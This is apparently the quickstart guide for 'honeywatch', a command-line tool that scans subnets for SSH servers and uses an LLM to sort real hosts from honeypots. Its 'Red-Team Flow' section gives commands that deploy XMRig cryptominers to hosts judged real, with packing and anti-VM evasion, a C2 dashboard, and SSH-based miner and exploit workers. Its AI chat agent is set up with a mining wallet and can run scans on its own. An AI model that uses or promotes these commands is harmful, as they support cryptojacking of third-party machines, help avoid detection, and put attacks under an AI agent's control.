# Quickstart

Get from zero to scored hosts in under five minutes.

## 1. Install and Configure

```bash
python -m pip install -e .
honeywatch config --write config.toml   # writes ./config.toml from defaults
cat config.toml
```

`config.toml` is optional — honeywatch runs on built-in defaults. It is picked up from `./config.toml` or `$HONEYWATCH_CONFIG` (`honeywatch/config.py:220`). See [Configuration](configuration.md).

Set your Ollama key (or skip AI with `--no-ai`):

```bash
export OLLAMA_API_KEY=ollama_...
export HONEYWATCH_MODEL=gpt-oss:20b   # optional
```

## 2. Probe a Single Host

No scanner needed — pure asyncio:

```bash
# fast fingerprint + heuristic + AI verdict
honeywatch probe 1.2.3.4 --skip-vpn-check

# full host-key SHA-256 (needs paramiko)
honeywatch probe 1.2.3.4 --probe-level full --skip-vpn-check

# many hosts, no LLM call, machine-readable
honeywatch probe 1.2.3.4 5.6.7.8 --no-ai --json --skip-vpn-check
```

Example output (`honeywatch/cli.py:625` `_print_probe`):

```
host:      1.2.3.4:22
banner:    SSH-2.0-OpenSSH_9.3p1 Ubuntu-1
protocol:  2.0
software:  OpenSSH
version:   9.3p1
flags:     kex_skew
heuristic: 0.150
ai:        real (confidence 0.920)
model:     llama3.1:8b
  - Banner and KEXINIT consistent with OpenSSH 9.3
  - Modern ciphers (chacha20-poly1305) present
final:     real (confidence 0.612)
```

JSON mode (`--json`, `honeywatch/cli.py:654`):

```json
{
  "ip": "1.2.3.4",
  "port": 22,
  "banner": "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1",
  "protocol": "2.0",
  "software": "OpenSSH",
  "version": "9.3p1",
  "host_key_type": "ssh-ed25519",
  "host_key_sha256": "SHA256:...",
  "flags": [],
  "anomalies": [],
  "heuristic_score": 0.15,
  "ai": {"classification": "real", "confidence": 0.92, "model": "llama3.1:8b", "reasons": ["..."]},
  "final_label": "real",
  "final_confidence": 0.612
}
```

## 3. Scan a Subnet

Requires `masscan`/`zmap` on Linux (or WSL2) and Mullvad VPN connected:

```bash
# default tool masscan, port 22, saved to honeywatch.db + reports/
honeywatch scan 192.0.2.0/24 --skip-vpn-check

# explicit tool, multi-port, rate, cap
honeywatch scan 10.0.0.0/8 --tool masscan --ports 22,2222 --rate 1000 --max-hosts 2000 --skip-vpn-check

# zmap variant (single-port, lighter)
honeywatch scan 192.0.2.0/24 --tool zmap --rate 5000 --skip-vpn-check

# heuristic-only, custom report formats
honeywatch scan 192.0.2.0/24 --no-ai --report-format json,csv,md --skip-vpn-check

# keep non-SSH hosts (debug)
honeywatch scan 192.0.2.0/24 --all-hosts --skip-vpn-check

# resume an interrupted scan (skips already-scored hosts)
honeywatch scan 192.0.2.0/24 --resume --skip-vpn-check

# live progress heartbeat every 1000 probes
honeywatch scan 10.0.0.0/16 --progress --skip-vpn-check

# loop every hour until Ctrl-C
honeywatch scan 192.0.2.0/24 --interval 3600 --skip-vpn-check
```

Scan prints:

```
scanning 1 target(s) on ports 22 with masscan (rate=1000)
reports written to reports (scan-20260318-120000.*)

counts by final label:
  real           42
  honeypot       7
  uncertain      3

top 10 by confidence:
  host                                     label        confidence
  192.0.2.5:22                             honeypot          0.880
  ...
```

## 4. Reports and Stats

Every scan writes `honeywatch.db` (SQLite, WAL) + `reports/scan-<stamp>.{json,csv,md}`. Re-render anytime:

```bash
honeywatch report --format json --limit 200          # top 200 by confidence
honeywatch report --format csv --label honeypot
honeywatch report --format md  --min-confidence 0.9 --out reports/custom.md

honeywatch stats                 # human table
honeywatch stats --json          # machine-readable
```

Report columns (`honeywatch/report.py:142`): `ip,port,final_label,final_confidence,heuristic,ai_classification,ai_confidence,banner,software,version,flags`.

## 5. Red-Team Flow (Optional)

After discovery + classification, deploy a payload:

```bash
# dry-run: show what would be deployed
honeywatch deploy stratum --target-file targets.txt \
  --var upstream_pool=pool.example.com:3333 --dry-run --skip-vpn-check

# enqueue XMRig against high-confidence real hosts (uses store selection)
honeywatch deploy xmrig --target-label real --min-confidence 0.9 \
  --var pool=stratum+tcp://pool.example.com:3333 \
  --var wallet=YOUR_WALLET --skip-vpn-check

# chain evasion
honeywatch deploy xmrig --target-file targets.txt \
  --evasion upx,symbol_strip,anti_vm --var pool=... --var wallet=... --skip-vpn-check

# C2 dashboard (needs [c2] extra)
pip install honeywatch[c2]
honeywatch c2 --generate-certs --skip-vpn-check
# open https://127.0.0.1:8443/

# worker
honeywatch worker --categories miner --exec-mode dry_run
honeywatch worker --categories miner,exploit --exec-mode ssh --ssh-user admin --ssh-key /path/to/id_rsa
```

See [Payloads](payloads.md), [C2 Controller](c2.md), [Ops & Targeting](ops.md).

## 6. AI Chat Agent

```bash
honeywatch setup --ollama-api-key ollama_... --pool pool.example.com:3333 --wallet YOUR_WALLET
honeywatch chat                          # interactive REPL
honeywatch chat --prompt "scan 192.0.2.0/24 and report honeypots"
```

Slash commands inside chat: `/help`, `/status`, `/setup`, `/wallet`, `/ollama`, `/model`, `/clear`, `/history`, `/quit`. See [Agent](agent.md).

## Next Steps

- [CLI Reference](cli.md) — all 10 subcommands with flags
- [Configuration](configuration.md) — every `config.toml` key
- [Architecture](architecture.md) — how the pieces fit
- [VPN Gate](vpn.md) — Mullvad enforcement details
